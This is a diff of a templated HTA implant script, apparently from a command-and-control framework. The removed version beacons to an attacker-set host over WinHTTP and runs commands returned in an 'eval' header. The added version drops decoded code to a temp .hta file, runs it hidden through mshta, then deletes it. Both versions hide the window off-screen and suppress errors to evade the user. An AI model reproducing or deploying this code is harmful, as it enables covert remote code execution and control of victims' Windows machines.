@@ -2,50 +2,21 @@
  <head>
  <script language="JScript">
 
-window.moveTo(-1000, -2000);
-window.blur();
-window.resizeTo(2, 4);
+ window.moveTo(-1000, -2000);
+ window.blur();
+ window.resizeTo(2, 4);
 
-try
-{
-    window.onerror = function(sMsg, sUrl, sLine) { return false; }
-    window.onfocus = function() { window.blur(); }
-}
-catch (e){}
+ try
+ {
+     window.onerror = function(sMsg, sUrl, sLine) { return false; }
+     window.onfocus = function() { window.blur(); }
+ }
+ catch (e){}
 
-var {{variables['errors'][0]}} = {{variables['errors'][1]}};
 var {{variables['file-system-object'][0]}} = {{variables['file-system-object'][1]}}
-var {{variables['host'][0]}} = "{{variables['host'][1]}}";
-var {{variables['port'][0]}} = "{{variables['port'][1]}}";
-var {{variables['sleep'][0]}} = "{{variables['sleep'][1]}}";
-var {{variables['useragent'][0]}} = "{{variables['useragent'][1]}}";
-var {{variables['content-type'][0]}} = "{{variables['content-type'][1]}}";
-var {{variables['x-frame-options'][0]}} = "{{variables['x-frame-options'][1]}}";
 var {{variables['wscript.shell'][0]}} = {{variables['wscript.shell'][1]}}
-
-function {{variables['post-req'][0]}}(data){
-  try {
-    var {{variables['winhttp.winhttprequest'][0]}} = {{variables['winhttp.winhttprequest'][1]}}
-    {{variables['winhttp.winhttprequest'][0]}}.Open('Post', 'http://{{variables['host'][1]}}:{{variables['port'][1]}}{{checkin_uri}}');
-    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("User-Agent", "{{variables['useragent'][1]}}");
-    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("X-Frame-Options", "{{variables['x-frame-options'][1]}}");
-    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Content-Type", "{{variables['content-type'][1]}}");
-    {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("Connection-ID", "{{connection_id}}");
-    if(typeof(data) == 'string') {
-      {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "text/plain");
-    } else {
-      {{variables['winhttp.winhttprequest'][0]}}.setRequestHeader("mimetype", "application/octet-stream");
-    }
-    {{variables['winhttp.winhttprequest'][0]}}.Send(data);
-    {{variables['winhttp.winhttprequest'][0]}}.WaitForResponse();
-    return {{variables['winhttp.winhttprequest'][0]}};
-  } catch (e) {
-    {{variables['errors'][0]}} = {{variables['errors'][0]}} + 1;
-    if({{variables['errors'][0]}} > 50){
-      window.close();
-    }
-  }
-}
+var {{variables['tmp'][0]}} = {{variables['tmp'][1]}}
+var mshta = unescape("{{code}}")
 
 function kill() {
   try {
@@ -66,29 +37,21 @@ function kill() {
   catch (e){}
 }
 
-var results = '';
-var obj = { eval: eval };
-function main() {
-  window.setTimeout("main()", {{variables['sleep'][0]}}, "JScript")
-  if(results != ''){
-    response = {{variables['post-req'][0]}}(results);
-    results = '';
-  } else {
-    response = {{variables['post-req'][0]}}(results);
+function main(){
+  var path = {{variables['tmp'][0]}} + "\\\{{variables['random_str']}}.hta";
+  var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
+  fd.WriteLine(mshta);
+  fd.close();
+  {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false)
+  var now = new Date().getTime();
+  while((new Date().getTime() - now) < 5000){
+    // do nothing
   }
-
-  try {
-    command = unescape(response.GetResponseHeader('eval'));
-    try {
-      results = obj.eval(command);
-    } catch (e) {
-      results = 'Failed to run ' + command + ': ' + e.message;
-    }
-  } catch (e) {}
+  {{variables['file-system-object'][0]}}.DeleteFile(path);
+  kill()
 }
 
 main()
-
  </script>
  <hta:application caption="no" windowtate="minimize" showInTaskBar="no" scroll="no" navigable="no" />
  </head>
